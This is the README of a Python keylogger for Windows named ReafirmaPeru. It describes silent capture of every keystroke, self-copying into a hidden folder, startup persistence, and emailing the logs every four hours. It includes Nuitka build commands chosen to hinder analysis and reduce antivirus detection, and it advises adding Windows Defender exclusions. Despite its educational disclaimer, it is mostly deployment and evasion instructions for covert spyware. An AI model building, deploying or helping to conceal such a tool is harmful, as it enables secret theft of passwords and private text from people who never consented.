# ReafirmaPeru - Python Keylogger

Keylogger silencioso para Windows escrito en Python. Captura todas las pulsaciones de teclado, las guarda en un archivo local y opcionalmente las envia por correo electronico. Diseñado con fines educativos para cursos de seguridad informatica y ethical hacking.

> **Disclaimer:** Esta herramienta es solo para uso educativo y pruebas de seguridad autorizadas. El uso contra personas sin su consentimiento explicito es ilegal.

## Que hace

- Captura todas las teclas presionadas (incluidas teclas especiales: Enter, Tab, Backspace, etc.)
- Guarda los logs localmente en una carpeta oculta: `%USERPROFILE%\FileSystem\keylog.txt`
- Cada entrada tiene timestamp: `[2026-04-15 16:30:00] texto capturado`
- (Opcional) Envia los logs por correo cada 4 horas via Gmail SMTP
- Si el envio falla (sin internet, credenciales incorrectas), no crashea y reintenta en el siguiente ciclo
- Al ejecutarse por primera vez:
  - Se copia a si mismo a `%USERPROFILE%\FileSystem\reafirmaPeru.exe`
  - Crea un acceso directo en `shell:startup` para iniciar con Windows
  - La carpeta y el ejecutable quedan ocultos (atributos +h +s)
- No requiere privilegios de administrador

## Estructura

```
├── main.py                          # Punto de entrada y configuracion
├── keylogger.py                     # Clase Keylogger (logica principal)
├── keylogger_persistance_windows.py # Version alternativa con persistencia via registro
├── requirements.txt                 # Dependencias
├── reafirma_logo.png                # Icono del proyecto
└── reafirma_logo.ico                # Icono convertido para el .exe
```

## Instalacion

### Requisitos
- Python 3.8+ (recomendado 3.10 - 3.11)
- Windows 10/11

### Dependencias
```bash
pip install -r requirements.txt
```

O manualmente:
```bash
pip install pynput
```

## Configuracion

Edita `main.py` para ajustar los parametros:

```python
# Intervalo para guardar en archivo local (en segundos)
SAVE_INTERVAL = 120

# Email y password (opcional - dejar None para solo guardar local)
EMAIL = None            # "tucorreo@gmail.com"
PASSWORD = None         # "tu-app-password"

# Intervalo para enviar por correo (en segundos, 14400 = 4 horas)
EMAIL_INTERVAL = 14400
```

> **Nota:** Si quieres usar el envio por correo con Gmail, necesitas generar una [App Password](https://myaccount.google.com/apppasswords) (requiere 2FA activado). Gmail no acepta contraseñas normales para SMTP.

## Uso

### Ejecucion directa (desarrollo/testing)
```bash
python main.py
```

### Compilar a .exe (produccion)

Se usa **Nuitka** para compilar a codigo C nativo (mejor ofuscacion que PyInstaller):

```bash
pip install nuitka[onefile]

nuitka --onefile --windows-console-mode=disable --assume-yes-for-downloads --remove-output --windows-icon-from-ico=reafirma_logo.ico --output-filename=reafirmaPeru.exe main.py
```

Esto genera un unico archivo `reafirmaPeru.exe` (~6 MB) sin dependencias externas.

### Despliegue

Solo haz doble clic en `reafirmaPeru.exe`. El programa:

1. Crea `%USERPROFILE%\FileSystem\` (carpeta oculta)
2. Se copia ahi como `reafirmaPeru.exe` (archivo oculto)
3. Crea acceso directo `reafirmaPeru.lnk` en `shell:startup`
4. Comienza a capturar teclas silenciosamente
5. A partir del siguiente reinicio, se ejecuta automaticamente

### Donde se guardan los logs
```
C:\Users\<usuario>\FileSystem\keylog.txt
```

### Como detenerlo
Abrir el Administrador de Tareas (`Ctrl+Shift+Esc`) > buscar `reafirmaPeru.exe` > Finalizar tarea.

Para desinstalarlo completamente:
1. Eliminar el acceso directo en `shell:startup`
2. Eliminar la carpeta `%USERPROFILE%\FileSystem\`

## Formato del log

```
[2026-04-15 16:30:00] hola como estas
[2026-04-15 16:32:00] usuario Key.ctrl_l c
[2026-04-15 16:34:00] password123 [BACK]  [BACK] 
```

## Notas

- El .exe se compila con Nuitka a codigo C nativo, lo que dificulta el analisis y reduce la deteccion por antivirus comparado con PyInstaller
- No requiere privilegios de administrador en ningun momento
- Si el antivirus lo detecta, agrega una excepcion en Windows Defender para la carpeta del proyecto o para `%USERPROFILE%\FileSystem\`

## Licencia

MIT License - Solo para uso educativo y pruebas de seguridad autorizadas.

